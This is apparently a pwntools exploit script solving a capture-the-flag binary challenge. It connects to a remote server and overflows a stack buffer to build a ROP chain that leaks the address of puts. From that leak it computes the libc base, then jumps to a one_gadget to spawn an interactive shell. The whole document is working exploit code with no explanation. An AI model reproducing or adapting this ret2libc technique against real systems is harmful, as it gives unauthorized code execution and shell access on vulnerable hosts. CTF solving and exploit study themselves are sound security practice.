from pwn import *
import sys

elf = ELF("bin/chall_patched")
libc = ELF("lib/libc.so.6")

# io = process(elf.path)
io = remote("65.21.255.31", 13370)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# gdb.attach(io, gdbscript = "b *040134c")

pop_rdi_ret = 0x401433
ret = 0x40101a
stack_base_addr = elf.bss() + 0xa000
one_gadget = 0xe3b01

# libc leak
io.sendlineafter(b"size: ", b"1s%")
io.sendlineafter(b"data: ", b"A")

p = b"A" * 0x48
p += p64(pop_rdi_ret)
p += p64(elf.got["puts"])
p += p64(elf.plt["puts"])
p += p64(elf.sym["main"])
io.sendline(p)
r = io.recv(6)
libc.address = u64(r + b"\x00\x00") - libc.sym["puts"]
print("libc addr:" + hex(libc.address))

# ret2libc
io.sendlineafter(b"size: ", b"1s%")
io.sendlineafter(b"data: ", b"A")

p = b"A" * 0x48
p += p64(libc.address + one_gadget)
io.sendline(p)

io.interactive()